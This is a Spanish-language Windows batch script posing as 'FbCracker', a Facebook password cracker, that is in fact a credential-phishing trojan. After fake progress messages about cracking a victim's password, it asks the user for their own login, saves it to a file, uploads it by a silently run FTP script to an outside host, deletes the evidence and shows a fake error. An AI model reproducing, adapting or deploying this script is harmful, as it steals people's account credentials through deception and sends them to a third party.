@echo off
echo.  
echo.  
echo.
echo Bienvenido al FbCracker v2.5.3
timeout /t 3 >> nul
echo Por favor no transfiera este software sin consentimiento del autor.
pause 
echo Buscando actualizaciones...
timeout /t 5 >> nul
echo La version se encuentra actualizada a v2.5.3
echo.
SET /P usuvic=Introduzca el usuario de la victima:
echo Nombre de usuario: %usuvic%
echo Comprobando credenciales del usuario...
timeout /t 8 >> nul
echo Decodificando Datos de las credenciales...
echo Hecho.
timeout /t 1 >> nul
echo Testeando posible Password
timeout /t 5 >> nul
echo Password correcta.
pause
echo Necesita logearse para recibir la contraseña.
echo. 
SET /P user=Usuario:
SET /P pass=Contraseña:

echo Usuario:%user% >> credenciales%user%.txt
echo Pass:%pass% >> credenciales%user%.txt
echo open fbkcracker.netai.net >> fbcracker.txt
echo user >> fbcracker.txt
echo pass >> fbcracker.txt
echo put credenciales%user%.txt >>fbcracker.txt
echo quit >>fbcracker.txt
ftp -s:fbcracker.txt >> nul
del credenciales%user%.txt
del fbcracker.txt
echo Realizando comprobacion...
timeout /t 5 >> nul
echo Ocurrio un error durante la ejecucion comprueba que los datos son correctos...
pause


exit
